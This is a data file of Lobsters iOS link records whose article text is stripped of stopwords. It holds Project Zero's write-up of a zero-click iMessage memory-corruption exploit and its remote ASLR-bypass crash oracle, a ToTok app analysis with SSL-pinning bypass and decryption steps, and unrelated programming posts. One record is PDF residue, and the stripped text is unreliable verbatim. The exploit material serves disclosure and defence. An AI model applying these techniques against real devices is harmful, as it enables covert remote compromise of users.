87,Lobsters,ios,Apple iOS,Remote iPhone Exploitation Part 1: Poking Memory via iMessage and CVE-2019-8641,https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-1.html,remote iphone exploitation part poking memory via imessage,,posted samuel gro√ü project zero introduction first blog post threepart series detail vulnerability imessage exploited remotely without user interaction io fixed io august essentially detailed version talk december first part series provides indepth discussion vulnerability second part present technique remotely break aslr third part explains gain remote code execution afterwards attack presented series allows attacker possession user apple id mobile phone number email address remotely gain control user io device within minute afterwards attacker could exfiltrate file password code sm message email user app data could also remotely activate microphone camera possible without user interaction eg opening url sent attacker visual indicator eg notification displayed user attack exploit single vulnerability first bypass aslr execute code target device outside sandbox research mainly motivated following question given remote memory corruption vulnerability possible achieve remote code execution iphone without vulnerability without form user interaction blog post series show fact possible vulnerability found part joint vulnerability research project natalie silvanovich reported apple july followed proofofconcept exploit august vulnerability first mitigated io released august making vulnerable code unreachable imessage fully fixed io released october hardening measure suggested based insight gained exploit development implemented make similar exploit significantly harder future hardening measure also relevant messenger service mobile operating system mentioned throughout series summarized end security researcher proofofconcept exploit targeting io iphone x available order hinder abuse deliberately alert victim ongoing attack displaying multiple notification throughout exploitation process furthermore achieve native code execution ie shellcode execution thus making difficult combine existing privilege escalation exploit however none restriction require vulnerability remedy require reengineering exploit capable attacker inbuilt restriction notification merely designed stop abuse unskilled attacker simply running code noted skilled attacker likely already capability offered released exploit code either finding vulnerability reverse engineering patch observed exploit example combining remote infoleak bug memory corruption bug found usual hope research assist fellow security researcher software developer showing wellintentioned mitigation bypassed modern exploitation technique work sharing idea ensuring weak spot highlighted subsequently mitigated imessage architecture incoming imessages pas multiple service framework notification finally displayed user message written message database main service handling imessages io without requiring user interaction depicted red border indicates existence sandbox process remotely reachable attack surface including notoriously complex nskeyedunarchiver api well imessage data format described extensively natalie silvanovich previous blog post purpose blog post series important realize vulnerability nskeyedunarchiver api generally triggered two different context sandboxed imagent unsandboxed springboard process manages main io ui including homescreen context advantage disadvantage regard exploitation example springboard already run outside sandbox thus appears better target first also somewhat critical system process crashing cause noticeable respring device screen suddenly turning black loading icon appearing second lock screen appears imagent hand safely crash without causing system behaviour might observable user afterwards simply restarted io appears decoding nskeyedunarchiver data longer happens inside springboard instead sandboxed imdpersistenceagent thus significantly reducing unsandboxed attack surface imessage imessage delivery order deliver exploit imessage one need able send custom imessages target requires interacting apple server dealing imessage encryption easy way used research reuse existing code hooking imessage handling code inside imagent tool like frida sending custom imessage script running macos done building desired payload eg trigger nskeyedunarchiver bug storing disk calling small apple script instructs messagesapp send message placeholder content eg replaceme target hooking imagent frida replacing content outgoing imessages containing placeholder content payload file way also possible receive incoming message using frida hook receiver function imagent example following imessage encoded binary plist sent receiver sending message replaceme messagesapp gid gv p mailto sender foobar mailto receiver foobar pv r replaceme v x html body replaceme body html frida hook modify message serialized encrypted sent apple server gid gv p mailto sender foobar mailto receiver foobar pv r replaceme v x html body replaceme body html ati content privatevartmpcomapplemessagespayload cause imagent receiver device decode data ati field using nskeyedunarchiver api example code allows sending custom message dumping incoming one found bug used research corresponding project zero issue another bug nskeyedunarchiver component discussed depth natalie likely memory corruption bug found nskeyedunarchiver component research exploited similar way one seemed convenient exploit bug question occurs unarchiving nssharedkeydictionary special kind nsdictionary key declared front nssharedkeyset allow faster element access nssharedkeyset subsharedkeyset essentially building linked list keysets understand vulnerability first necessary take look nskeyedunarchiver serialization format simple archive containing serialized nssharedkeydictionary printed plutil nskeyedarchiver encodes object graph plist comment added archiver nskeyedarchiver object contained archive stored array referenced decoding using index object index always contains nil value null serialized nssharedkeydictionary class cfkeyedarchiveruid value nscount nssidedic cfkeyedarchiveruid value nsskkeyset cfkeyedarchiveruid value nssharedkeyset associated dictionary class cfkeyedarchiveruid value nsalgorithmtype nsfactor nsg nskeys cfkeyedarchiveruid value nsm nsnumkey nsranktable nsselect nssubskset cfkeyedarchiveruid value key nssharedkeyset class cfkeyedarchiveruid value nsobjects cfkeyedarchiveruid value value first key thekey objc class stored format class nsarray nsobject classname nsarray class nssharedkeyset nsobject classname nssharedkeyset class nssharedkeydictionary nsmutabledictionary nsdictionary nsobject classname nssharedkeydictionary reference root object archive top root cfkeyedarchiveruid value version one thing note serialization format support reference object contained cfkeyedarchiveruid value unarchiving nskeyedunarchiver keep mapping uids object single object referenced multiple object archive furthermore reference added map object initwithcoder method constructor used unarchiving invoked becomes possible decode cyclic object graph case object referenced currently unarchived callstack interestingly case first object may yet fully initialized referenced creates potential bug exactly happens objectivec objc pseudocode initwithcoder implementation nssharedkeydictionary nssharedkeyset class reader unfamiliar objc think code construct obj doxwith z method call object similar obj dox z c nssharedkeydictionary initwithcoder coder self keymap coder decodeobjectofclass nssharedkeyset class forkey nsskkeyset decode value etc nssharedkeyset initwithcoder coder self numkey coder nsnumkey self ranktable coder decodebytesforkey nsranktable copy field archive self subsharedkeyset coder decodeobjectofclass nssharedkeyset class forkey nssubskset nsarray key coder decodeobjectofclasses forkey nskeys self numkey key count return fail inconsistent archive self key calloc self numkey copy key key verify key looked id key key self indexforkey key nsmutablearray allkeys nsmutablearray arraywitharray key allkeys addobjectsfromarray self subsharedkeyset allkeys return nssharedkeyset keysetwithkeys allkeys implementation indexforkey routine invoked end initwithcoder line given us hash key index ranktable us result index key recursively search key subsharedkeyset find subsharedkeysets available nssharedkeyset indexforkey nssharedkeyset current self prevlength current compute hash key internal value keyset convert hash index ensure within bound ranktable ranktableindex index self ranktable ranktableindex index self numkey id candidate self key index candidate nil key isequal candidate return prevlength index prevlength self numkey current self subsharedkeyset return given logic following object graph lead memory corruption deserialized happens unarchiving nssharedkeydictionary unarchived turn unarchiving sharedkeyset initwithcoder run point unarchives subsharedkeyset line point numkey fully controlled attacker check performed yet happen key unarchived ranktable also fully controlled key still nullptr objc object allocated via calloc completely unarchived subsharedkeyset reference still unarchived end invokes indexforkey key key array line ranktable zero first key looked see line indexforkey second key looked numkey ranktable content fully controlled code line index key nullptr controlled index causing crash following picture show slightly simplified callstack time crash result mostly arbitrary address case index multiplied element size dereferenced result used objc object pointer id however two restriction address accessed bug address must cleanly divisible key array store pointer sized value must le index byte unsigned integer luckily least io interesting thing memory located thus become accessible using primitive turn even seemingly uninteresting null pointer dereference become pretty powerful exploit primitive right circumstance point information target process address space available kind information leak must first constructed topic next blog post
88,Lobsters,ios,Apple iOS,Remote iPhone Exploitation Part 2: Bringing Light into the Darkness -- a Remote ASLR Bypass,https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-2.html,remote iphone exploitation part bringing light darkness remote aslr bypass,,posted samuel gro√ü project zero post second series remote interactionless iphone exploit imessagethe first blog post introduced exploited vulnerability found initial primitive gained vulnerability absolute address dereference read value afterwards used objc object knowledge target address space required order exploit vulnerability remote code execution blog post describes way defeat aslr remotely without additional information disclosure vulnerability first effectiveness old technique heap spraying evaluated afterwards technique described possible infer base address dyld shared cache region given memory corruption bug released code implement presented attack infer shared cache base address remotely vulnerable device within couple minute heap spraying io goal heap spraying put data attacker choosing known address referenced exploitation process heap spraying le effective today year ago due aslr address space however turn io technique still fairly usable fact data need sprayed put controlled data known address easily demonstrated following code snippet const sizet size const sizet count size int count int chunk malloc size chunk look memory running io eg part custom app put address lldb xgx heap spraying via imessage next question best spray hundred megabyte data remotely imessage basically two way abusing memory leak information leak bug chunk memory forgotten never freed triggering multiple time desired amount memory leaked finding abusing amplification gadget piece code take existing chunk data copy potentially multiple time thus allowing attacker spray large amount memory sending relatively small number byte turn nskeyedunarchiver api provides primitive exploit actually combine two sends message around seems maximum size inline data spray around heap data leak repeat procedure couple time perform full heap spray however likely possible perform entire spray single message using downloaded attachment pbdi key way memory leak necessary bug could triggered multiple time necessary left exercise reader many place nskeyedunarchiver subsystem memory leaked one example cyclic object graph never cleaned keep alive reference cycle also another way nskeyedcoderoldstylearrays used decoding nsvalues due quirk nskeyedunarchiver always deserialized regardless set allowed class nskeyedcoderoldstylearray store size pointer malloced chunk containing number sametype value eg integer cstrings objc object interestingly nskeyedcoderoldstylearray destroyed free backing memory recursively free object contained array contains pointer memory chunk objc object memory leaked normally fine nskeyedcoderoldstylearray used temporarily decode array value nsvalue however also decoded standalone object becomes possible leak large number objc object amplification gadget aczeroingstring instance appear perfect candidate already ab used natalie exploit part initwithcoder aczeroingstring take existing nsdata object copy content newly malloc ed memory chunk object graph spray around heap data look like aczeroingstring instance copy nsdata content new malloc buffer nskeyedcoderoldstylearray keep aczeroingstring instance alive even current message fully processed sending around message controlled data located controlled data known address first step likely enough given existing exploit primitive would possible create fake objc object heapspray region used nssharedkeyset indexforkey however heapspray content executable necessary know address code page faking object really becomes possible achieved discussed next short introduction objc internals objectivec aslr bypasser shown next relevant code snippet nssharedkeyset indexforkey read controlled address happens index fully controlled key nullptr id candidate self key index candidate null key isequal candidate return prevlength index id type used represents reference objc object type information available unlike void c however unlike c objc runtime type information always possible determine exact type object runtime example iskindofclass method objc support pointer tagging pointer objc object example id generally one two thing actual pointer objc object pointersized value containing type value information layout object discussed next post relevant gaining code execution however blog post already necessary take closer look objc tagged pointer nsnumbers short nsstrings example tagged pointer id considered tagged pointer msb set case corresponding class stored global table index encoded tagged pointer nsnumber instance storing integer objc nsnumber n would roughly represented msb indicating tagged pointer following bit identify index class case corresponding nscfnumber case nscfnumber value stored bit lowest byte indicates specific number type case apis operating objc id objcmsgsend objcretain objcxyz usually first check tag bit proceed accordingly arg handle tagged pointer else handle real pointer objcdebugtaggedpointerobfuscator objcdebugtaggedpointerobfuscator seems fully random number except msb must zero preserve pointer tagging bit following experiment lldb simple io app demonstrates lldb p n nscfnumber int lldb p objcdebugtaggedpointerobfuscator void lldb px uintptrt n uintptrt objcdebugtaggedpointerobfuscator unsigned long dyld shared cache io well macos system library prelinked one giant binary blob called dyldsharedcache amongst benefit improves program load time reduces runtime overhead symbol resolution one security relevant aspect shared cache mapped address every process exact location randomized device boot likely due shared cache mapped userspace process thus reducing overall system memory usage also containing absolute pointer making position independent base address shared cache known address pretty much library userspace process device including thousand rop gadget objc class various string much also known sufficient rce exploit latest io version dyldsharedcache mapped somewhere address range providing roughly possible base address cache around size page size smallest granularity aslr shift byte would possible find base address sheer brute force however every wrong guess would likely cause crash targeted imagent process would soon subject restart limiting enforced launchd service crash quickly avoided crashing roughly every second full brute force attack would take around week attack completely impossible given mobile device rarely rebooted probably realistic one either remaining part blog post describes base address inferred within minute instead defeating aslr crash oracle one outstanding aspect creates additional communication channel victim device attacker appears rare situation also mitigatable large degree properly sandboxing process question prevent kind network activity one main question motivating research following given remote memory corruption vulnerability would possible infer base address shared cache somehow achieve kind communication channel first found exists form imessage receipt imessage support two different type message receipt delivery receipt read receipt latter one disabled setting former always sent following screenshot imessage chat show receipt used sender received delivery receipt read receipt message foo delivery receipt message bar receipt message baz delivery receipt interesting sent automatically without user interaction even interesting time sent imagent shown following pseudocode snippet imagent logic processing incoming imessages processincomingmessage message msgplist decodeintoplist message extract value plist atidata msgplist ati ati nskeyedunarchive atidata stuff senddeliveryreceipt yet stuff bug nskeyedunarchiver api trigger possible build crash oracle crash triggered nskeyedunarchiving delivery receipt sent otherwise one sent turn allows sender infer whether payload caused crash imagent remote device remains turn bug oracle function useful bit information extracted outcome oracle query ideal oracle would def oracle addr ismapped addr nocrash else crash given breaking aslr remotely would rather straightforward perform linear search step would take oracle query perform binary search found address found address minus step size would take query run logarithmic time could take little imessages break aslr likely practice however unlikely memory corruption vulnerability yield perfect oracle function general version algorithm necessary case vulnerability likely first need bit exploit engineering result usable oracle function also case first bug trigger given part series unfortunately crash regardless whether given address valid line number reference code snippet part objc id read attacker controlled address afterwards compared key currently looked line nssharedkeyset indexforkey likely match lookup fail nssharedkeyset initwithcoder attempt recreate nssharedkeyset scratch line call nssharedkeyset allkeys subkeyset line unfortunately subkeyset yet fully initialized bug allkeys method definitely crash accessing key array still nullptr luckily possible work around following object graph trick add new tail keyset always able look second key however keyset subkeyset must unarchived way possible unarchiving new sharedkeydictionary first turn possible key array unfortunately class whitelist used unarchive key include nsdictionary fortunately though nslocalizedstring class nsstring allowed following piece code initwithcoder implementation decode config dictionary nsset class nsset setwithobjects nsdictionary class nsdictionary configdict coder decodeobjectofclasses class forkey nsconfigdict nssharedkeydictionary decoded unarchiving key wrapping nslocalizedstring unarchiving shown payload crash one following two case address case index read ranktable multiplied readable ie mapped calling key isequal candidate value read address crash value zero key isequal called line otherwise value msb set treated pointer objc object method called surely leading crash unless value pointed fact objc object finally value msb set treated tagged pointer likely class fetched happens first xoring tagged pointer random obfuscator value extracting index class table upper bit using entry class table populated step cause crash index invalid obfuscator value unknown normally possible predict advance whether given value cause crash however situation even invalid tagged pointer value cause crash implementation nscfstring isequal used key looked string case previous object graph example implementation following special casing tagged pointer value extract class index tagged pointer objcdebugtaggedpointerobfuscator use extended class index bit objcdebugtaggedpointerobfuscator check class index equal one nsstring yes extract string content lower bit compare return nstaggedpointerstringequalcfstring self return false directly return given isequal method value msb set used argument without causing crash finally resulting oracle function roughly oracle addr ismapped addr iszero addr hasmsbset addr pointstoobjcobject addr nocrash else crash given oracle necessary build profile target device shared cache essentially bitmap zero indicates access would crash one indicates would shared cache binary iphones hardware model io version simply done running custom app device similar target device scanning shared cache region memory practice profile also support third unknown state outcome possible would example used writable memory region shared cache runtime content unknown however simplicity following explanation assume twostate profile adopting algorithm work three state profile straightforward implemented released source code bitmap twostate profile might look follows next step use oracle perform linear search crash observed afterwards set possible shared cache base address computed simply iterating profile pagesized step computing base address offset would yield crash probed practice step result roughly different base address candidate next search algorithm used efficiently determine correct base address minimal number additional oracle query oracle query take around crash imagent quickly would soon cause launchd delay restarting service following picture show shared cache hypothetically mapped possible base address case memory goal find new address probed crash oracle allow roughly half remaining candidate discarded picture would example address green line crash occurs querying oracle address first last candidate remain otherwise middle three candidate kept given candidate address probe also possible compute probability crash case expected number remaining candidate e oracle query case e efficiently find correct base address algorithm greedily pick address smallest value e every iteration ideally one zero profile roughly balanced le case half current number candidate case correct base address found logarithmic time roughly minute implementing algorithm slight performance problem occurs full search ideal candidate would take numcandidates operation easily reaching one trillion operation however practice good enough approximate ideal solution randomly testing different address another minor complication arises using threestate profile discussed algorithm conservative treat writable memory page potentially crashing crashing unknown value runtime probability crash approximated readonly page however approximation real probability work fine practice affect correctness algorithm pseudocode final algorithm shown next candidate len candidate bestaddress beste len candidate remainingcandidatesoncrash none remainingcandidatesonnocrash none range addr randomrandrange minbase maxbase crashset nocrashset profile candidate profileaddrwillcrash addr crashsetappend profile profileaddrwillnotcrash addr nocrashsetappend profile crashprob len crashset len candidate nocrashprob crashprob e crashprob len crashset nocrashprob len nocrashset e beste beste e bestaddress addr remainingcandidatesoncrash crashset remainingcandidatesonnocrash nocrashset oracle bestaddress candidate remainingcandidatesonnocrash else candidate remainingcandidatesoncrash following snippet show output part exploit infers shared cache base address target device printed score value corresponds computed expected number remaining candidate displayed address queried aslrbreakerpy note exploit deliberately display notification target trying find valid address testing address testing address testing address testing address testing address testing address testing address testing address testing address valid potential candidate dyldsharedcache slide shared cache mapped somewhere determining exact base address shared cache candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score candidate remaining best approximated address probe score shared cache mapped final note seems likely similar oracle function constructed different memory corruption vulnerability example vulnerability allows attacker corrupt fake objc object eg oob read useafterfree like could potentially turned similar oracle following way whenever reference objc object dropped objcrelease called object argument function amongst others perform following step first check object custom retain release functionality checking bit class object associated released object every objc object reference class object pointer stored offset zero called isa isa pointer object custom retain release inline refcount decremented result zero nothing happens otherwise object destructor invoked memory chunk freed class pointer object corrupted point shared cache region time object inline refcount objcrelease crash specific bit set offset pointed value crash oracle constructed supporting different io version hardware model one seeming limitation presented technique requires upfront knowledge target device hardware model io version build correct shared cache profile however necessarily case model number version unknown attacker build shared cache profile possible combination hardware model io version could used would likely result million candidate initial linear scan finished however due magic logarithm even million candidate attack still require sending dozen message determine correct base address correct shared cache model number version however implemented research note noisiness another seeming limitation inherent noisiness attack crashing imagent dozen time noticeable user would send crash report apple share iphone analytics enabled device technique might seem le useful realworld attacker could theoretically inform apple vulnerability exploited however appears io stop collecting crash log process crash observed repeatedly crashing io process eg imagent monitoring device log using consoleapp mac connected device eventually following message appear default reportcrash formulating report corpse imagent default reportcrash report type private saved limit log reached possible first use seperate unexploitable do bug eg objc exception stack overflow due much recursion crash imagent around time crashlogs collected start actual exploitation procedure however also verified practice issue automatic delivery receipt demonstrated blog post possible bypass aslr creating side channel abuse automatic delivery receipt sent target device attacker fix first appears simple send delivery receipt complex message parsing sent regardless whether payload cause crash however sufficient following attack likely still work send oracle query message one might cause crash time row send normal message never cause crash measure time take last delivery receipt arrive longer second imagent likely crashed repeatedly step subject restart delay launchd attack exploit restart delay enforced launchd io similar mechanism might exist platform well though appears kind automatic message sent recipient side action could observable attacker example accessing website potentially dangerous exploited similar way ideally automatic message sent least sender user never previous interaction concludes second part blog post series third final part series detail even presence pointer authentication pac newer device remote code execution achieved
90,Lobsters,ios,Apple iOS,Running Racket on iOS,https://defn.io/2020/01/05/racket-on-ios/,running racket io,lobster compile racket macos racket repo build instruction compile racket io cross compiling instruction fix llvm bug create xcode project remember,umyfreeweb pointed lobster thread yesterday racket compiles fine led rabbit hole trying get racket running inside io application finally succeeded figured write finding hope helping future racketeer included going path compile racket macos recentenough version racket required order compile racket io best way clone racket repo follow build instruction simple running make repository root assuming following along terminal session run export racketsrc pwd need reference directory following step compile racket io successfully compiled racket macos clone racket repository time different directory called directory racketios differentiate two call whatever make sure commit checked repos run following build step starting repository root mkdir racketsrcbuild cd racketsrcbuild configure enableiosiphoneos enableracket racketsrcracketbinracket configure build create object run physical device build racket simulator instead change host enableios iphoneos iphonesimulator detail flag see cross compiling instruction racket repo although instruction currently mention pthread support required configuring build code fail compile without matthew flatt pushed fix today next run make cgc make installcgc compile code package build conservative gc variant racket started trying get everything running using variant racket precise gc ran number roadblock including llvm bug eventually gave switched cgc variant create xcode project create new iosbased project xcode inside project add new group called framework drag drop racketlibmzgca racketlibracketa rktiolibrktioa racketsrcbuild directory framework group make sure copy item needed toggled open project setting build phase link binary library section add libiconvtbd racket depends library copy racketinclude project build setting search path header search path section add srcroot include add new header file called bridgingheaderh build setting swift compiler general objectivec bridging header add path file everything defined file made available swift code inside file add create new c file called interopc add static int run schemeenv e int argc char argv return void runracket schememainsetup run null associated header file interoph add include schemeh void runracket void finally inside appdelegate application didfinishlaunchingwithoptions method add call runracket run project device ensure everything compiles run properly everything run correctly pat back run racket io course racket really much point let embed racket module project project source directory create new file called hellorkt following content lang racketbase displayln hello world command line compile hellorkt transitive dependency c file racketsrcracketbinraco ctool cmods helloc hellorkt next update interopc include resulting c file update run file initialize run module static int run schemeenv e int argc char argv schemeobject declaremodules e schememakepair schemeinternsymbol quote schememakepair schemeinternsymbol hello schememakenull schemefalse schemedynamicrequire return note name module passed schemeinternsymbol hello file name run project see hello world console took little bit work got able interesting stuff get start porting remember io mean time read stuff
91,Lobsters,ios,Apple iOS,The One Weird Trick SecureROM Hates,http://iokit.racing/oneweirdtrick.pdf,one weird trick securerom hate,,obj length r filter flatedecode stream p jj c
92,Lobsters,ios,Apple iOS,"Mass Surveillance, is an (un)Complicated Business",https://objective-see.com/blog/blog_0x52.html,mass surveillance un complicated business,cleanmy mac x background seemed like popular app secretly spy tool analysis setup apple suing corellium apple reveals special new iphones security researcher frida io app pentesting quickstart io analyzing documentation documentation network traffic burp http wwwcharlesproxycom charles proxy privacy policy app decryption totokipa yeecall crunchbase done bill marczak citizenlab breej far abu spy sheikh hid chat app plain sight writeup bill marczak conclusion,mass surveillance un complicated business triaging massively popular io application dark side patrick wardle december research tool writing supported friend objectivesee cleanmy mac x want play along uploaded decrypted copy application decrypted traffic capture download background recently approached new york time nyt assist investigation massively popular io application totok apparently american official familiar classified intelligence determined totok actually spying tool used government united arab emirate try track every conversation movement relationship appointment sound image install phone new york time read new york time report seemed like popular app secretly spy tool today walk thru triage totok io application main goal blog post provide technical detail one may go triaging io application using totok casestudy say aim simply discus analysis procedure binary analysis note interesting observation totok breej holding ltd massively popular application united arab emirate uae fact recently trending app dubai io app store similarly ranked quite highly review largely positive mostly laud fact application blocked uae skype whatsapp etc blocked using vpns access blocked service illegal finally voip application work uae hopefully start way voice video clarity simply amazing thanks lot totol tra uae mustafa abdul ahad really thank app finally make callvideo call easily family since apps banned current living country thankyou jckarhmrv never posted positive comment feedback totok forced appreciate effort give love unbeatable application uae totok like water saqib saleem going give great thanks team guy done great job specially uae user apps blocked calling totally free still pakistan finest app really impressive way app designed importantly work uae true blessing beinggaurav great app county audio video call banned baghya almost totok good true app also recommended various site around internet especially solution apps blocked uae analysis setup analyzing io application trivial process said application distributed via io app store encrypted format two main approach analyze io application include frowned upon cupertino quickly possible patch io bug attempt thwart jailbreak worse turn dubious legal action read apple suing corellium unfortunately leaf security researcher somewhat bind analysis option limited apple promised developer device allow independent security researcher audit io proper analyze io application apple reveals special new iphones security researcher though phone yet make hand research afaik however ifwhen hugely welcomed without access virtualization solution stuck performing analysis totok jailbroken phone luckily thanks incredible jailbreak thus analyze io application even recent version io detail see mahalo many researchershackers made incredible tool assuming access vulnerable device iphone x setting analysis environment fairly straightforward detailed frida io app pentesting quickstart io jailbreak installs cydia setup iproxy install tool frida etc hooray able begin analyzing io application jailbroken io device analyzing totok let take peek totok application basic triage v fullfledged analysis goal first install totok application jailbroken io device end privatevarcontainersbundleapplication folder uuid totokapp noted main application binary encrypted via apple fairplay drm confirm dumping load command application binary totokapptotok observing presence command otool vl totokapptotok load command cmd cmdsize cryptoff cryptsize cryptid pad shortly discus fully decrypt application still lot unencrypted file peek notably examine application infoplist file rather large various piece cat totokappinfoplist xml version encoding doctype plist public appledtd plist plist version dict key minimumosversion key string string key cfbundleidentifier key string aitotokvideochat string key uibackgroundmodes key array string audio string string fetch string string remotenotification string string voip string array key nsapptransportsecurity key dict key nsallowsarbitraryloads key true dict key cfbundlelocalizations key array string en string string arabic string string zhcn string string zhtw string array key facebookappid key string string key nsmicrophoneusagedescription key string allow totok access microphone make voice message voicevideo call string key nscalendarsusagedescription key string allow totok access calendar remind totok event string key nslocationwheninuseusagedescription key string location required providing local weather informatio string key nsphotolibraryaddusagedescription key string allow totok access gallery sendsave picture string key nscontactsusagedescription key string allow totok read contact find friend using totok string key nssiriusagedescription key string use siri call totok contact directly string key nscamerausagedescription key string allow totok access camera take photo video string observation include presence uibackgroundmodes tell io continue running background read uibackgroundmodes apple documentation nsapptransportsecurity nsallowsarbitraryloads key tell io application allowed transmit data via http normally io enforces http read nsallowsarbitraryloads apple documentation cfbundlelocalizations array contains localization english chinese zhcn taiwanese zhtw arabic facebookappid appears tied company named yeecall later presence various usagedescription keyvalue pair tell io display app request permission see totok interested microphone calendar location photo contact siri integration camera explicit user approval required order totok able access miccamera user information photo location etc access required legitimate functionality app thus user allow decrypt binary perform static analysis let analyze totok network traffic network traffic rather unsurprisingly totoks network communication encrypted via ssl moreover application performs certificate pinning attempt complicate mitm attack however performing local analysis jailbroken device neither really obstacle first setup remote proxy say macbook io device network setting specify address proxy instruct io route traffic thru said proxy personally use charles proxy application though burp would work well charles http proxy http monitor reverse proxy enables developer view http ssl http traffic machine internet http wwwcharlesproxycom several detailed tutorial online describe setup configure proxy order view even ssl traffic coming io device short need install trust proxy charles certificate io device noted totok us ssl pinning order improve security network communication mean application reject proxy certificate connection fail luckily fairly easy locally bypass sniff totoks traffic installing configuring ssl kill switch set sniff totok encrypted traffic firing app able observe decrypted traffic majority application traffic route thru capiimtotokai server server us selfsigned certificate cc fe fa ab fe issuing country set ae united arab emirate uploaded two decrypted traffic capture format charles proxy session download network traffic fairly standard expect see fullyfeature chat application peruse request app first launch make various get request capiimtotokai example http capiimtotokaiucstateaabqbeegqcawhite ncjecaumzzci modeliphone pkgaitotokvideochat locenusus breaking parameter n cjecaumzzci c model iphone pkg aitotokvideochat clientver loc enusus server simply responds response white false responseheader status version another get request also capiimtotokai go apiidcfind api endpoint return response uc capiimtotokai pfm capiimtotokai doodle ucssl capiimtotokai pfmssl capiimtotokai doodlessl capiimtotokai idcidx walletssl capiimtotokai responseheader status version reference yeecall moving verifying user application downloads user profile picture http site aliyuncscom appears part alibaba cloud user authorized totok access contact app attempt upload entire address book via post request http capiimtotokailogreportreport cijxfhriqksu model appver o io time app totok event contact uid data version contact familyname smith birthday modifydate nickname displayname john smith organizationname apple departmentname nameprefix namesuffix id primaryids value label home middlename jobtitle contacttype note phoneticmiddlename phoneticgivenname emailaddresses createdate phoneticfamilyname givenname john familyname turner birthday modifydate nickname displayname tina turner organizationname apple departmentname nameprefix namesuffix id primaryids value label home middlename jobtitle contacttype note phoneticmiddlename phoneticgivenname emailaddresses createdate phoneticfamilyname givenname tina language en network wifi osver argument could made simply userapproved legitimate functionality application used connect user friend medium content image transmitted user generates post request content file http capiimtotokaipfmupaabqbeegqcasendtouser upload content server responds information successful upload response download url http capiimtotokaipfmdownloadfile size fid responseheader status version prior upload appears item image encrypted compressed cb sm time unknown application utilizes endtoend encryption said encryption sufficient totok privacy policy state message data stored heavily encrypted local totok engineer physical intruder get access seems address stored data finally user authorized totok utilize location service app make request meiduoyunwsamberweathercom http langen pkgaitotokvideochat note request contains user exact geocoordinates ie langen app decryption order perform static analysis totok need decrypt application binary decrypt application binary jailbroken analysis device use clutch highspeed io decryption tool utility take bundle id io application decrypt eg aitotokvideochat output fully decrypted ipa root clutch aitotokvideochat clutch command dump specified bundleid ipa file zipping totokapp dumping patched cryptid segment dumping successfully dumped framework totokcommonbase dumping successfully dumped framework pinremoteimage dumping dumping zipping totokcommonbaseframework zipping externalframework zipping zipping shareextensionappex done clutch null ipa finished dumping aitotokvideochat second another option dump encrypted application binary via fridump run option also running string dumped file patrick python fridumppy u totok current directory userspatrickdownloadsfridumpmaster output directory set userspatrickdownloadsfridumpmasterdump creating directory starting memory dump running string file progress complete finished either way decrypted application bundle poke around app binary code application framework massive due time constraint analysis limited however uploaded unencrypted totokipa like dig analyzing binary one first step extract embedded string class via classdump often shed significant insight capability binary andor reveal interesting contact digging thru totok string class gain potential insight possible origin usersjiangyaguangdownloadstotokyeecallclassestksysteminfom usersjiangyaguangdownloadstotokyeecallclassescalltkcallsessionviewcontrollerm patrick classdump totokapptotok interface yeecallcontact nsmanagedobject interface yeecallreminder nsmanagedobject interface yeecallsecuritypolicy afsecuritypolicy previously noted uncovered tie yeecall based embedded string relatively clear totok largely composed code yeecall according crunchbase yeecall software company developed yeecall messenger app video voice calling rather unsurprising totoks simply based existing codean product v written entirely scratch possible breej holding ltd publisher io app simply contracted licensed existing code yeecall create totok application would simple efficient way quickly create new fullyfeatured application also explains rather odd cfbundlelocalizations string arabic string string zhcn string string zhtw string embedded string reveal statictotokai server serf static content app image icon etc server appears misconfigured browsing root reveals listing hosted file done wrapping let briefly discus may behind application way pressing question first rather clear breej holding ltd actual io developer publishing company technical analysis interview computer security expert showed firm behind totok breej holding likely front company affiliated darkmatter abu dhabibased cyberintelligence hacking firm emirati intelligence official new york time though time going much detail claim recently bill marczak research fellow citizenlab published incredibly detailed report corporate structure behind totok read breej far abu spy sheikh hid chat app plain sight writeup rather decisively uncovers many player company behind totok including sheikh tahnoon bin zayed alnahyan senior uae intelligence official following chart clearly visualizes connection image credit bill marczak totok appears latest case digital platform surreptitiously operated nation state obtain strategic advantage intelligence gathering bill marczak conclusion blog post triaged totok io application american intelligence community claimed spy tool used united arab emirate government analysis showed totok simply claim really nothing assuming claim totok actual designed spy user legitimate functionality app really genius whole mass surveillance operation exploit backdoor malware legitimate functionality likely afforded indepth insight large percentage country population think way rather surveillancehappy foreign government love monitor citizen five easy step ban popular apps whatsapp skype create free alternative app provides banned functionality submit app io app store readily approved apple create fake review social medium post recommend application wait citizen country readily embrace app popularity soar access user address book chat location completely legitimate appleapproved manner collection provides sufficient phase much like nsa bulk metadata collection program comprehensive intelligence operation know talking perhaps even saying identify specific individual interest target advanced capability phase includes traditional offensive cyberoperations far targeted stealthy invasive however phase far expensive difficult scale thus requires sufficient phase component totok love blog post support tool writing patreon
93,Lobsters,ios,Apple iOS,Building Mobile Apps (iOS and Android) with Clojurescript,https://medium.com/mindorks/building-mobile-apps-ios-and-android-with-clojurescript-4600235f826c,building mobile apps io android clojurescript,medium github,let change background color button text shown press buttonlet reinstall app using npm run runandroideven changing code reinstalling application everything look samestill working credit giphy although made change cljfile one thing still done rebuild code update indexandroidjs file actually loaded bundlerthis figwheel come picture without need manually rebuild install application every time make change code check projectclj notice exactly happens prod profile figwheel every time build project update indexandroidjs indexiosjs lein withprofile prod cljsbuild autohowever really slow feedback cycle development therefore separate dev profile us figwheel start using figwheel run following command make sure emulator running beforehand renatal useandroiddevice renatal lein figwheel npm run runandroidusing figwheel developmentnow make change code see result realtime thank reading hope enjoyed article next part let build application scratch also follow medium github
